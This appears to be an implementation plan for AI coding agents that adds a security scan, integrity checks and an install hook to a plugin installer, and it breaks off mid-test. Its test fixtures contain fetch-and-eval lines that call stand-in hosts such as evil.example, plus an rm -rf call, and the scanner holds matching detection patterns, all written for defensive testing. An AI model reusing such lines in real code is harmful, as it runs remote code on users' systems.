# Trustworthy Install Completion — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close the residual S2 (plugin install) and S3 (`BEFORE_INSTALL` hook) gaps from the 2026-05-06 OpenClaw deep-comparison brief by adding `git+https://`/`https://` install sources, an AST + regex security scan, an `oc plugin verify` integrity-drift command, and a new `BEFORE_INSTALL` lifecycle hook — all without touching concurrency or the existing catalog install path.

**Architecture:** All changes live under `opencomputer/plugins/` (extends `remote_install.py`, adds `install_security_scan.py`, `integrity.py`, `installed_index.py`) and `plugin_sdk/hooks.py` (one new `HookEvent`). `cli_plugin.py` gets two new flags and one new subcommand. Existing catalog install flow is byte-identical when no new flags are used.

**Tech Stack:** Python 3.12+, stdlib `ast`/`tarfile`/`subprocess`/`shutil`, existing `httpx` for HTTP, existing pytest + ruff. No new dependencies.

**Spec:** `docs/superpowers/specs/2026-05-06-openclaw-deep-comparison-followup-design.md`

---

## File Structure

```
opencomputer/plugins/
├── remote_install.py            # MODIFY — extract _http_get_bytes/extract_tarball into helpers; add _install_from_git, _install_from_url; thread BEFORE_INSTALL through
├── install_security_scan.py     # NEW — AST + regex pattern guard with ScanReport dataclass
├── integrity.py                 # NEW — re-fetch + bytes-compare helpers for `oc plugin verify`
├── installed_index.py           # NEW — read/write ~/.opencomputer/<profile>/plugins/.installed_index.json
└── (loader.py, security.py — UNTOUCHED)

plugin_sdk/
└── hooks.py                     # MODIFY — add HookEvent.BEFORE_INSTALL + 4 optional HookContext fields; extend ALL_HOOK_EVENTS

opencomputer/
└── cli_plugin.py                # MODIFY — accept git+/https:// in install; add `verify` subcommand

tests/
├── test_remote_install_git.py   # NEW
├── test_remote_install_url.py   # NEW
├── test_install_security_scan.py # NEW
├── test_install_hooks.py        # NEW
├── test_integrity.py            # NEW
└── test_installed_index.py      # NEW
```

**Why these splits:** each helper module owns one concern (scan / index / integrity). `remote_install.py` is already 452 LOC and grows by ~250; splitting `_install_from_git` into a separate module would force passing 5+ private helpers across files, which is worse than letting one cohesive module grow modestly. Tests mirror the production module names so coverage gaps are visible at a glance.

---

## Pre-execution setup

- [ ] **Setup-1: Create a dedicated worktree on a fresh branch off origin/main**

```bash
cd /Users/saksham/Vscode/claude/OpenComputer
git fetch origin
git worktree add ../oc-trustworthy-install -b feat/trustworthy-install origin/main
cd ../oc-trustworthy-install
```

Why a worktree: parallel-session safety per memory rule "Worktrees for Parallel Sessions" (2026-05-01). The parent tree stays on `main` so other sessions don't collide.

- [ ] **Setup-2: Verify clean baseline**

```bash
cd ../oc-trustworthy-install
git log --oneline -3
pytest tests/test_remote_install.py -q   # existing catalog tests must pass before we touch anything
ruff check opencomputer/plugins/ plugin_sdk/
```

Expected: latest 3 commits visible; existing tests pass; ruff clean.

- [ ] **Setup-3: Editable install in this worktree**

```bash
pip install -e .
```

Per memory rule "Editable install + parallel sessions" — without this, the local `oc` binary still runs whatever code the parent worktree's branch has. With it, `oc plugin install ...` from this worktree exercises the new code.

- [ ] **Setup-4: Create a tests helper module to avoid cross-test imports**

Create `tests/_helpers/__init__.py` (empty) and `tests/_helpers/install_fixtures.py`:

```python
"""Shared helpers for install-related tests.

Lives outside `tests/conftest.py` because conftest is auto-loaded; we
want explicit imports so the helper's surface is discoverable.
"""

from __future__ import annotations

import hashlib
import io
import json
import tarfile


def make_tarball(plugin_id: str, plugin_py_body: str = "def register(api):\n    pass\n") -> bytes:
    """Return raw gzipped tar bytes containing a minimal single-file plugin."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        manifest = json.dumps(
            {"id": plugin_id, "name": plugin_id, "version": "0.1.0", "entry": "plugin.py"}
        ).encode()
        info = tarfile.TarInfo(name="plugin.json")
        info.size = len(manifest)
        tar.addfile(info, io.BytesIO(manifest))

        body = plugin_py_body.encode()
        info2 = tarfile.TarInfo(name="plugin.py")
        info2.size = len(body)
        tar.addfile(info2, io.BytesIO(body))

    return buf.getvalue()


def fake_catalog(plugin_id: str, raw_tarball: bytes) -> dict:
    sha = hashlib.sha256(raw_tarball).hexdigest()
    return {
        "schema_version": 1,
        "plugins": [
            {
                "id": plugin_id,
                "version": "0.1.0",
                "tarball_url": f"https://example.test/{plugin_id}.tgz",
                "tarball_sha256": sha,
            }
        ],
    }
```

All test files in this plan import from `tests._helpers.install_fixtures` rather than from each other.

---

## Task 1: Add `BEFORE_INSTALL` hook event to plugin_sdk

**Files:**
- Modify: `plugin_sdk/hooks.py`
- Test: `tests/test_phase6a_hooks.py` (existing) — add a new test fn

- [ ] **Step 1.1: Write the failing test**

Create a new file `tests/test_before_install_hook.py` (do NOT extend any existing hook test file — keeps the new test surface auto-discoverable):

```python
def test_before_install_hook_event_exists():
    from plugin_sdk.hooks import HookEvent, ALL_HOOK_EVENTS

    assert HookEvent.BEFORE_INSTALL == "BeforeInstall"
    assert HookEvent.BEFORE_INSTALL in ALL_HOOK_EVENTS


def test_before_install_hook_context_fields():
    from plugin_sdk.hooks import HookContext, HookEvent

    ctx = HookContext(
        event=HookEvent.BEFORE_INSTALL,
        session_id="install-session",
        install_source="git",
        install_url="git+https://github.com/example/plugin.git",
        install_plugin_id="example-plugin",
        install_scan_report=None,
    )
    assert ctx.install_source == "git"
    assert ctx.install_url == "git+https://github.com/example/plugin.git"
    assert ctx.install_plugin_id == "example-plugin"
    assert ctx.install_scan_report is None
```

- [ ] **Step 1.2: Run test to verify it fails**

```bash
pytest tests/test_before_install_hook.py -v
```

Expected: FAIL with `AttributeError: BEFORE_INSTALL` and `TypeError: __init__() got an unexpected keyword argument 'install_source'`.

- [ ] **Step 1.3: Add the hook event + HookContext fields**

In `plugin_sdk/hooks.py`:

1. Add to the `HookEvent` enum at the bottom (preserve declaration order — these fields go AFTER all existing events):

```python
    # 2026-05-06 — install lifecycle (S3 leftover from OpenClaw deep-comparison)
    BEFORE_INSTALL = "BeforeInstall"
```

2. Add 4 optional fields to `HookContext` (all default to None, all positional-keyword):

```python
    # 2026-05-06 — install lifecycle context fields. Populated only for
    # BEFORE_INSTALL; default None so existing HookContext callers across
    # the loop / gateway / approval paths stay unchanged.
    #:
    #: Install source: "catalog" | "git" | "url" | "path".
    install_source: str | None = None
    #: Raw URL the user typed (or slug for catalog, abs path for path).
    install_url: str | None = None
    #: Resolved plugin id (post-extract, post-manifest-parse).
    install_plugin_id: str | None = None
    #: install_security_scan.ScanReport — typed loosely as object so the SDK
    #: doesn't need to re-import it (the plugin loader is the only producer).
    install_scan_report: object | None = None
```

3. Append `HookEvent.BEFORE_INSTALL` to `ALL_HOOK_EVENTS` after the last existing entry.

4. Update the module docstring's "Available events" list with one line: `BeforeInstall          — fires before plugin extract activates an install`

- [ ] **Step 1.4: Run test to verify it passes**

```bash
pytest tests/test_before_install_hook.py -v
```

Expected: 2 passed.

- [ ] **Step 1.5: Run the SDK boundary guard + ruff**

```bash
pytest tests/test_phase6a.py::test_plugin_sdk_does_not_import_opencomputer -v
ruff check plugin_sdk/hooks.py
```

Expected: pass; ruff clean.

- [ ] **Step 1.6: Commit**

```bash
git add plugin_sdk/hooks.py tests/test_before_install_hook.py
git commit -m "feat(plugin_sdk): add BEFORE_INSTALL hook event"
```

---

## Task 2: Implement `install_security_scan.py`

**Files:**
- Create: `opencomputer/plugins/install_security_scan.py`
- Test: `tests/test_install_security_scan.py`

- [ ] **Step 2.1: Write the failing test**

Create `tests/test_install_security_scan.py`:

```python
"""Tests for install_security_scan.py — AST + regex guard."""

from __future__ import annotations

from pathlib import Path

import pytest

from opencomputer.plugins.install_security_scan import (
    Finding,
    InstallSecurityScanError,
    ScanReport,
    scan_plugin_dir,
)


def _make_plugin(tmp_path: Path, name: str, body: str) -> Path:
    pdir = tmp_path / name
    pdir.mkdir()
    (pdir / "plugin.json").write_text('{"id":"x","name":"x","version":"0.1.0","entry":"plugin.py"}')
    (pdir / "plugin.py").write_text(body)
    return pdir


def test_clean_plugin_has_no_findings(tmp_path: Path):
    pdir = _make_plugin(tmp_path, "ok", "def register(api):\n    pass\n")
    report = scan_plugin_dir(pdir)
    assert report.findings == []
    assert report.has_blocks() is False


def test_eval_of_network_fetch_blocks(tmp_path: Path):
    body = (
        "import requests\n"
        "def register(api):\n"
        "    eval(requests.get('https://evil.example/payload').text)\n"
    )
    pdir = _make_plugin(tmp_path, "evil", body)
    report = scan_plugin_dir(pdir)
    assert any(f.severity == "block" for f in report.findings)
    assert report.has_blocks() is True


def test_rm_rf_warns_but_does_not_block(tmp_path: Path):
    body = (
        "import subprocess\n"
        "def register(api):\n"
        "    subprocess.run(['rm', '-rf', '/tmp/foo'])\n"
    )
    pdir = _make_plugin(tmp_path, "rm", body)
    report = scan_plugin_dir(pdir)
    assert any(f.severity == "warn" for f in report.findings)
    assert report.has_blocks() is False


def test_unparseable_file_warns_softly(tmp_path: Path):
    pdir = _make_plugin(tmp_path, "broken", "def register(api):\n    !@# this is not python\n")
    report = scan_plugin_dir(pdir)
    # Soft warn, not a block — Python loader will catch the real error at import.
    assert any(f.severity == "warn" and "parse" in f.pattern for f in report.findings)
    assert report.has_blocks() is False


def test_finding_excerpt_is_truncated(tmp_path: Path):
    long_body = "x = '" + "A" * 5000 + "'\n"
    pdir = _make_plugin(tmp_path, "long", long_body)
    report = scan_plugin_dir(pdir)
    for f in report.findings:
        assert len(f.excerpt) <= 240


def test_raise_for_blocks_raises_when_block_present(tmp_path: Path):
    body = "eval(__import__('urllib.request').urlopen('http://x').read())\n"
    pdir = _make_plugin(tmp_path, "evil2", body)
    report = scan_plugin_dir(pdir)
    with pytest.raises(InstallSecurityScanError):
        report.raise_for_blocks()


def test_raise_for_blocks_no_op_when_only_warns(tmp_path: Path):
    pdir = _make_plugin(tmp_path, "ok2", "def register(api):\n    pass\n")
    report = scan_plugin_dir(pdir)
    report.raise_for_blocks()  # must not raise
```

- [ ] **Step 2.2: Run test to verify it fails**

```bash
pytest tests/test_install_security_scan.py -v
```

Expected: 7 collection errors (`ModuleNotFoundError: opencomputer.plugins.install_security_scan`).

- [ ] **Step 2.3: Implement `install_security_scan.py`**

Create `opencomputer/plugins/install_security_scan.py`:

```python
"""AST + regex guard that runs after extract, before BEFORE_INSTALL hook.

Scope (Phase 1, see docs/superpowers/specs/2026-05-06-openclaw-deep-comparison-followup-design.md §3.3):

* `eval`/`exec`/`compile` whose argument is a network-fetch chain → BLOCK.
* `subprocess` / `os.system` calls referencing `rm -rf` → WARN.
* Suspicious raw-socket usage (DNS/TCP exfil shapes) → WARN.
* Unparseable .py files → WARN (the Python loader will catch real syntax errors at import).

Initial pattern severities are deliberately conservative; promotion of WARN
patterns to BLOCK is a one-line change after dogfooding.
"""

from __future__ import annotations

import ast
import re
from dataclasses import dataclass, field
from pathlib import Path
from typing import Literal

# Single source of truth for severity strings — used by both Finding and ScanReport.
Severity = Literal["info", "warn", "block"]


@dataclass(frozen=True)
class Finding:
    severity: Severity
    file: str
    line: int
    pattern: str
    excerpt: str  # truncated source snippet, ≤ 240 chars

    def __post_init__(self) -> None:
        # Frozen dataclass — must use object.__setattr__ to mutate.
        if len(self.excerpt) > 240:
            object.__setattr__(self, "excerpt", self.excerpt[:237] + "...")


class InstallSecurityScanError(Exception):
    """Raised when ScanReport.raise_for_blocks() finds a block-severity finding."""

    def __init__(self, report: "ScanReport") -> None:
        self.report = report
        blocks = [f for f in report.findings if f.severity == "block"]
        msg = (
            f"plugin security scan blocked install ({len(blocks)} blocking finding(s)):\n"
            + "\n".join(f"  - {f.file}:{f.line} [{f.pattern}] {f.excerpt}" for f in blocks)
        )
        super().__init__(msg)


@dataclass(frozen=True)
class ScanReport:
    findings: list[Finding] = field(default_factory=list)

    def has_blocks(self) -> bool:
        return any(f.severity == "block" for f in self.findings)

    def raise_for_blocks(self) -> None:
        if self.has_blocks():
            raise InstallSecurityScanError(self)


# ─── Regex patterns (line-level) ───────────────────────────────────────

_REGEX_PATTERNS: list[tuple[str, Severity, re.Pattern[str]]] = [
    (
        "rm-rf-shell",
        "warn",
        re.compile(r"\brm\s+-rf\b|\bshutil\.rmtree\b|\bos\.unlink\b"),
    ),
    (
        "raw-socket",
        "warn",
        re.compile(r"\bsocket\.(socket|create_connection)\b"),
    ),
    (
        "os-system-shell",
        "warn",
        re.compile(r"\bos\.system\("),
    ),
]

# ─── AST visitor (block-severity patterns) ─────────────────────────────


_NETWORK_FETCH_NAMES = frozenset({"get", "post", "request", "urlopen", "Request"})


class _DangerousEvalVisitor(ast.NodeVisitor):
    """Detect eval/exec/compile whose argument is a network-fetch chain."""

    def __init__(self, file_str: str) -> None:
        self.file = file_str
        self.findings: list[Finding] = []

    def visit_Call(self, node: ast.Call) -> None:  # noqa: N802 — ast naming
        func_name = _name_of(node.func)
        if func_name in {"eval", "exec", "compile"}:
            if any(_arg_chain_contains_network_fetch(a) for a in node.args):
                self.findings.append(
                    Finding(
                        severity="block",
                        file=self.file,
                        line=node.lineno,
                        pattern="eval-of-network-fetch",
                        excerpt=ast.unparse(node)[:240],
                    )
                )
        self.generic_visit(node)


def _name_of(node: ast.AST) -> str:
    """Return a short string name for an AST node (best-effort)."""
    if isinstance(node, ast.Name):
        return node.id
    if isinstance(node, ast.Attribute):
        return node.attr
    return ""


def _arg_chain_contains_network_fetch(node: ast.AST) -> bool:
    """Walk an AST argument; return True if any sub-call's function name is a
    known network-fetch verb (requests.get, urllib.request.urlopen, etc.)."""
    for sub in ast.walk(node):
        if isinstance(sub, ast.Call):
            if _name_of(sub.func) in _NETWORK_FETCH_NAMES:
                return True
    return False


# ─── Top-level scan function ───────────────────────────────────────────


def scan_plugin_dir(plugin_dir: Path) -> ScanReport:
    """Scan every .py file under plugin_dir, return a ScanReport."""
    findings: list[Finding] = []
    for py in sorted(plugin_dir.rglob("*.py")):
        rel = str(py.relative_to(plugin_dir))
        try:
            source = py.read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError):
            findings.append(
                Finding(
                    severity="warn",
                    file=rel,
                    line=0,
                    pattern="unreadable-file",
                    excerpt="could not read source bytes",
                )
            )
            continue

        # AST pass (block patterns)
        try:
            tree = ast.parse(source, filename=rel)
        except SyntaxError as e:
            findings.append(
                Finding(
                    severity="warn",
                    file=rel,
                    line=getattr(e, "lineno", 0) or 0,
                    pattern="parse-error",
                    excerpt=str(e)[:240],
                )
            )
        else:
            visitor = _DangerousEvalVisitor(rel)
            visitor.visit(tree)
            findings.extend(visitor.findings)

        # Regex pass (warn patterns)
        for lineno, line_text in enumerate(source.splitlines(), start=1):
            for pattern_name, severity, regex in _REGEX_PATTERNS:
                if regex.search(line_text):
                    findings.append(
                        Finding(
                            severity=severity,
                            file=rel,
                            line=lineno,
                            pattern=pattern_name,
                            excerpt=line_text.strip()[:240],
                        )
                    )

    return ScanReport(findings=findings)


__all__ = [
    "Finding",
    "InstallSecurityScanError",
    "ScanReport",
    "Severity",
    "scan_plugin_dir",
]
```

- [ ] **Step 2.4: Run test to verify it passes**

```bash
pytest tests/test_install_security_scan.py -v
```

Expected: 7 passed.

- [ ] **Step 2.5: Lint**

```bash
ruff check opencomputer/plugins/install_security_scan.py tests/test_install_security_scan.py
```

Expected: clean.

- [ ] **Step 2.6: Commit**

```bash
git add opencomputer/plugins/install_security_scan.py tests/test_install_security_scan.py
git commit -m "feat(plugins): install_security_scan — AST + regex guard for plugin installs"
```

---

## Task 3: Wire scan + BEFORE_INSTALL hook into the existing catalog flow

**Files:**
- Modify: `opencomputer/plugins/remote_install.py`
- Test: `tests/test_install_hooks.py` (NEW)

- [ ] **Step 3.1: Write the failing test**

Create `tests/test_install_hooks.py`:

```python
"""End-to-end: BEFORE_INSTALL hook fires + receives ScanReport + can veto."""

from __future__ import annotations

from pathlib import Path

import pytest

from opencomputer.plugins.remote_install import (
    CatalogEntry,
    InstallResult,
    install_from_catalog,
)
from plugin_sdk.hooks import HookContext, HookDecision, HookEvent
from tests._helpers.install_fixtures import fake_catalog as _fake_catalog
from tests._helpers.install_fixtures import make_tarball as _make_tarball


def test_before_install_hook_fires_with_scan_report(tmp_path: Path):
    fired: list[HookContext] = []

    async def hook(ctx: HookContext) -> HookDecision | None:
        fired.append(ctx)
        return None

    raw = _make_tarball("clean-plugin")
    catalog = _fake_catalog("clean-plugin", raw)

    result = install_from_catalog(
        "clean-plugin",
        dest_root=tmp_path,
        fetch_catalog_fn=lambda **_: catalog,
        download_fn=lambda entry, **_: raw,
        before_install_hook=hook,
    )

    assert isinstance(result, InstallResult)
    assert len(fired) == 1
    ctx = fired[0]
    assert ctx.event == HookEvent.BEFORE_INSTALL
    assert ctx.install_source == "catalog"
    assert ctx.install_plugin_id == "clean-plugin"
    assert ctx.install_scan_report is not None
    assert ctx.install_scan_report.has_blocks() is False


def test_before_install_hook_can_veto(tmp_path: Path):
    async def reject(ctx: HookContext) -> HookDecision:
        return HookDecision(decision="block", reason="vetoed by test policy")

    raw = _make_tarball("vetoed-plugin")
    catalog = _fake_catalog("vetoed-plugin", raw)

    with pytest.raises(RuntimeError, match="vetoed by test policy"):
        install_from_catalog(
            "vetoed-plugin",
            dest_root=tmp_path,
            fetch_catalog_fn=lambda **_: catalog,
            download_fn=lambda entry, **_: raw,
            before_install_hook=reject,
        )

    # Plugin dir should NOT exist after veto
    assert not (tmp_path / "vetoed-plugin").exists()


def test_install_blocked_by_scan_finding(tmp_path: Path):
    body = (
        "import requests\n"
        "def register(api):\n"
        "    eval(requests.get('https://evil/x').text)\n"
    )
    raw = _make_tarball("evil-plugin", plugin_py_body=body)
    catalog = _fake_catalog("evil-plugin", raw)

    from opencomputer.plugins.install_security_scan import InstallSecurityScanError

    with pytest.raises(InstallSecurityScanError):
        install_from_catalog(
            "evil-plugin",
            dest_root=tmp_path,
            fetch_catalog_fn=lambda **_: catalog,
            download_fn=lambda entry, **_: raw,
        )

    assert not (tmp_path / "evil-plugin").exists()
```

- [ ] **Step 3.2: Run test to verify it fails**

```bash
pytest tests/test_install_hooks.py -v
```

Expected: failures — `install_from_catalog` doesn't accept `before_install_hook` kwarg yet, and doesn't run the scan.

- [ ] **Step 3.3: Extend `install_from_catalog` to call scan + fire hook + roll back on failure**

Modify `opencomputer/plugins/remote_install.py` — locate the existing `install_from_catalog` signature and `extract_fn(...)` call. Wrap the post-extract path with scan + hook:

```python
# Add near the top of the file, with other imports
from collections.abc import Awaitable, Callable
from typing import Any

# Type alias near other type aliases
BeforeInstallHook = Callable[[Any], Awaitable[Any]]


def install_from_catalog(
    slug: str,
    *,
    dest_root: Path,
    catalog_url: str | None = None,
    refresh: bool = False,
    force: bool = False,
    trusted_keys: dict[str, bytes] | None = None,
    fetch_catalog_fn=fetch_catalog,
    download_fn=download_and_verify,
    extract_fn=extract_tarball,
    # NEW kwargs (all optional, defaulted) — see design §3.4
    before_install_hook: BeforeInstallHook | None = None,
    skip_scan: bool = False,
) -> InstallResult:
    """End-to-end: fetch catalog → resolve slug → download → verify → extract
    → security-scan → fire BEFORE_INSTALL hook → finalize.

    ``skip_scan=True`` is for tests only; normal callers always run the scan.
    ``before_install_hook`` is an awaitable callable that receives a
    HookContext and may return a HookDecision with ``decision="block"`` to
    veto the install.
    """
    catalog = fetch_catalog_fn(
        url=catalog_url, refresh=refresh, trusted_keys=trusted_keys
    )
    entry = find_entry(catalog, slug)

    raw = download_fn(entry)

    plugin_dir = dest_root / entry.id
    if plugin_dir.exists():
        if not force:
            raise CatalogError(
                f"plugin '{entry.id}' already installed at {plugin_dir}. "
                "Use --force to overwrite."
            )
        import shutil

        shutil.rmtree(plugin_dir)

    extract_fn(raw, dest=plugin_dir)

    # Phase 1 — security scan + BEFORE_INSTALL hook. Roll back the dest dir
    # on any post-extract failure so a vetoed install never lands.
    try:
        _post_extract_gate(
            plugin_dir=plugin_dir,
            install_source="catalog",
            install_url=slug,
            install_plugin_id=entry.id,
            before_install_hook=before_install_hook,
            skip_scan=skip_scan,
        )
    except Exception:
        import shutil

        shutil.rmtree(plugin_dir, ignore_errors=True)
        raise

    return InstallResult(
        plugin_id=entry.id, version=entry.version, install_path=plugin_dir
    )


def _post_extract_gate(
    *,
    plugin_dir: Path,
    install_source: str,
    install_url: str,
    install_plugin_id: str,
    before_install_hook: BeforeInstallHook | None,
    skip_scan: bool,
) -> None:
    """Run security scan + fire BEFORE_INSTALL hook. Raise on veto/scan-block."""
    from opencomputer.plugins.install_security_scan import scan_plugin_dir
    from plugin_sdk.hooks import HookContext, HookEvent

    report = None if skip_scan else scan_plugin_dir(plugin_dir)
    if report is not None:
        report.raise_for_blocks()  # raises InstallSecurityScanError on block

    if before_install_hook is None:
        return

    ctx = HookContext(
        event=HookEvent.BEFORE_INSTALL,
        session_id=f"install:{install_plugin_id}",
        install_source=install_source,
        install_url=install_url,
        install_plugin_id=install_plugin_id,
        install_scan_report=report,
    )
    # CLI install is a sync typer command running outside an event loop, so
    # asyncio.run() is the correct primitive. If a future caller invokes
    # install_from_catalog from inside an async context, they should pass
    # ``before_install_hook=None`` and call the hook themselves; we don't
    # paper over that with run_until_complete fallback (deprecated on 3.12+).
    decision = asyncio.run(before_install_hook(ctx))

    if decision is not None and getattr(decision, "decision", "pass") == "block":
        reason = getattr(decision, "reason", "") or "blocked by BEFORE_INSTALL hook"
        raise RuntimeError(reason)
```

Add `import asyncio` to the file's imports if missing.

- [ ] **Step 3.4: Run test to verify it passes**

```bash
pytest tests/test_install_hooks.py -v
```

Expected: 3 passed.

- [ ] **Step 3.5: Run the full existing remote_install regression suite**

```bash
pytest tests/test_remote_install*.py -v
```

Expected: every pre-existing test still passes (catalog flow is byte-identical when `before_install_hook=None` and the plugin is clean).

- [ ] **Step 3.6: Lint + commit**

```bash
ruff check opencomputer/plugins/remote_install.py tests/test_install_hooks.py
git add opencomputer/plugins/remote_install.py tests/test_install_hooks.py
git commit -m "feat(plugins): wire AST scan + BEFORE_INSTALL hook into catalog install"
```

---

## Task 4: Add `installed_index.py` for source-of-truth post-install metadata

**Files:**
- Create: `opencomputer/plugins/installed_index.py`
- Test: `tests/test_installed_index.py`

This module is small and stands alone — adding it before git/url install means those install paths can write to it directly.

- [ ] **Step 4.1: Write the failing test**

Create `tests/test_installed_index.py`:

```python
from __future__ import annotations

from pathlib import Path

from opencomputer.plugins.installed_index import (
    InstalledRecord,
    read_index,
    record_install,
    remove_install,
)


def test_record_and_read_roundtrip(tmp_path: Path):
    index_path = tmp_path / ".installed_index.json"
    record_install(
        index_path,
        InstalledRecord(
            plugin_id="example",
            version="0.1.0",
            source="git",
            source_url="git+https://github.com/x/y.git",
            source_ref="abc123",
            tarball_sha256=None,
            installed_at=1700000000,
        ),
    )
    records = read_index(index_path)
    assert len(records) == 1
    r = records[0]
    assert r.plugin_id == "example"
    assert r.source == "git"
    assert r.source_ref == "abc123"


def test_record_overwrites_existing(tmp_path: Path):
    index_path = tmp_path / ".installed_index.json"
    record_install(
        index_path,
        InstalledRecord("p", "0.1.0", "catalog", "p", None, "abc", 100),
    )
    record_install(
        index_path,
        InstalledRecord("p", "0.2.0", "catalog", "p", None, "def", 200),
    )
    records = read_index(index_path)
    assert len(records) == 1
    assert records[0].version == "0.2.0"
    assert records[0].tarball_sha256 == "def"


def test_remove_install(tmp_path: Path):
    index_path = tmp_path / ".installed_index.json"
    record_install(
        index_path, InstalledRecord("a", "0.1.0", "catalog", "a", None, "x", 0)
    )
    record_install(
        index_path, InstalledRecord("b", "0.1.0", "catalog", "b", None, "y", 0)
    )
    remove_install(index_path, "a")
    records = read_index(index_path)
    assert {r.plugin_id for r in records} == {"b"}


def test_read_missing_file_returns_empty(tmp_path: Path):
    assert read_index(tmp_path / "does-not-exist.json") == []
```

- [ ] **Step 4.2: Run test to verify it fails**

```bash
pytest tests/test_installed_index.py -v
```

Expected: 4 collection errors (`ModuleNotFoundError`).

- [ ] **Step 4.3: Implement `installed_index.py`**

Create `opencomputer/plugins/installed_index.py`:

```python
"""Per-profile installed-plugin index.

Records the *source* of each installed plugin (catalog/git/url/path),
the verification metadata (sha256 or git ref), and the install timestamp.
This is the source of truth `oc plugin verify` uses to re-fetch and
compare bytes.

Lives at ``~/.opencomputer/<profile>/plugins/.installed_index.json`` —
hidden, JSON, one entry per installed plugin.

The file is rewritten atomically (write-tmp + rename) on every update.
"""

from __future__ import annotations

import json
import os
import tempfile
from dataclasses import asdict, dataclass
from pathlib import Path


@dataclass(frozen=True)
class InstalledRecord:
    plugin_id: str
    version: str
    source: str  # "catalog" | "git" | "url" | "path"
    source_url: str  # slug for catalog, git url for git, https url for url, abs path for path
    source_ref: str | None  # git sha when source=="git", else None
    tarball_sha256: str | None  # sha256 when source in ("catalog","url"), else None
    installed_at: int  # epoch seconds


def read_index(path: Path) -> list[InstalledRecord]:
    if not path.exists():
        return []
    try:
        raw = json.loads(path.read_text())
    except (OSError, json.JSONDecodeError):
        return []
    if not isinstance(raw, dict) or "plugins" not in raw:
        return []
    out: list[InstalledRecord] = []
    for entry in raw.get("plugins", []) or []:
        if not isinstance(entry, dict):
            continue
        try:
            out.append(
                InstalledRecord(
                    plugin_id=str(entry["plugin_id"]),
                    version=str(entry.get("version", "")),
                    source=str(entry.get("source", "")),
                    source_url=str(entry.get("source_url", "")),
                    source_ref=entry.get("source_ref"),
                    tarball_sha256=entry.get("tarball_sha256"),
                    installed_at=int(entry.get("installed_at", 0)),
                )
            )
        except (KeyError, TypeError, ValueError):
            continue
    return out


def _atomic_write(path: Path, payload: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    fd, tmp = tempfile.mkstemp(prefix=".idx-", dir=str(path.parent))
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, indent=2, sort_keys=True)
            fh.flush()
            os.fsync(fh.fileno())
        os.replace(tmp, path)
    except Exception:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise


def record_install(path: Path, record: InstalledRecord) -> None:
    """Insert or replace the record for record.plugin_id."""
    existing = [r for r in read_index(path) if r.plugin_id != record.plugin_id]
    existing.append(record)
    _atomic_write(
        path,
        {
            "schema_version": 1,
            "plugins": [asdict(r) for r in sorted(existing, key=lambda r: r.plugin_id)],
        },
    )


def remove_install(path: Path, plugin_id: str) -> None:
    remaining = [r for r in read_index(path) if r.plugin_id != plugin_id]
    if not remaining:
        # Empty index — keep the file so callers see schema_version.
        _atomic_write(path, {"schema_version": 1, "plugins": []})
        return
    _atomic_write(
        path,
        {
            "schema_version": 1,
            "plugins": [asdict(r) for r in sorted(remaining, key=lambda r: r.plugin_id)],
        },
    )


def find_record(path: Path, plugin_id: str) -> InstalledRecord | None:
    for r in read_index(path):
        if r.plugin_id == plugin_id:
            return r
    return None


__all__ = [
    "InstalledRecord",
    "find_record",
    "read_index",
    "record_install",
    "remove_install",
]
```

- [ ] **Step 4.4: Run test to verify it passes**

```bash
pytest tests/test_installed_index.py -v
```

Expected: 4 passed.

- [ ] **Step 4.5: Wire the existing catalog install to write the index**

Modify `install_from_catalog` in `opencomputer/plugins/remote_install.py` — at the end (just before `return InstallResult(...)`), add:

```python
    # Record the install in the index so `oc plugin verify` can re-fetch.
    from opencomputer.plugins.installed_index import (
        InstalledRecord,
        record_install,
    )
    import time

    index_path = dest_root / ".installed_index.json"
    record_install(
        index_path,
        InstalledRecord(
            plugin_id=entry.id,
            version=entry.version,
            source="catalog",
            source_url=slug,
            source_ref=None,
            tarball_sha256=entry.tarball_sha256.lower(),
            installed_at=int(time.time()),
        ),
    )
```

- [ ] **Step 4.6: Add a regression test that catalog install writes the index**

Add to `tests/test_install_hooks.py`:

```python
def test_catalog_install_writes_installed_index(tmp_path: Path):
    raw = _make_tarball("indexed-plugin")
    catalog = _fake_catalog("indexed-plugin", raw)

    install_from_catalog(
        "indexed-plugin",
        dest_root=tmp_path,
        fetch_catalog_fn=lambda **_: catalog,
        download_fn=lambda entry, **_: raw,
    )

    from opencomputer.plugins.installed_index import find_record

    rec = find_record(tmp_path / ".installed_index.json", "indexed-plugin")
    assert rec is not None
    assert rec.source == "catalog"
    assert rec.tarball_sha256 == catalog["plugins"][0]["tarball_sha256"]
```

- [ ] **Step 4.7: Run + commit**

```bash
pytest tests/test_installed_index.py tests/test_install_hooks.py -v
ruff check opencomputer/plugins/installed_index.py tests/test_installed_index.py
git add opencomputer/plugins/installed_index.py tests/test_installed_index.py opencomputer/plugins/remote_install.py tests/test_install_hooks.py
git commit -m "feat(plugins): per-profile installed-index for post-install source tracking"
```

---

## Task 5: Add `git+...` install source

**Files:**
- Modify: `opencomputer/plugins/remote_install.py`
- Test: `tests/test_remote_install_git.py`

- [ ] **Step 5.1: Write the failing test**

Create `tests/test_remote_install_git.py`:

```python
from __future__ import annotations

import json
import subprocess
from pathlib import Path
from unittest.mock import patch

import pytest

from opencomputer.plugins.remote_install import (
    GitNotFoundError,
    PluginIdMismatchError,
    install_from_git,
)


def _seed_local_repo(repo_dir: Path, plugin_id: str = "example") -> str:
    """Create a real local git repo with a plugin.json, return its HEAD sha."""
    repo_dir.mkdir(parents=True, exist_ok=True)
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=repo_dir, check=True)
    subprocess.run(["git", "-c", "user.email=t@t", "-c", "user.name=t",
                    "config", "commit.gpgsign", "false"], cwd=repo_dir, check=True)

    (repo_dir / "plugin.json").write_text(json.dumps({
        "id": plugin_id, "name": plugin_id, "version": "0.1.0", "entry": "plugin.py"
    }))
    (repo_dir / "plugin.py").write_text("def register(api):\n    pass\n")

    subprocess.run(["git", "add", "."], cwd=repo_dir, check=True)
    subprocess.run([
        "git", "-c", "user.email=t@t", "-c", "user.name=t",
        "commit", "-q", "-m", "init"
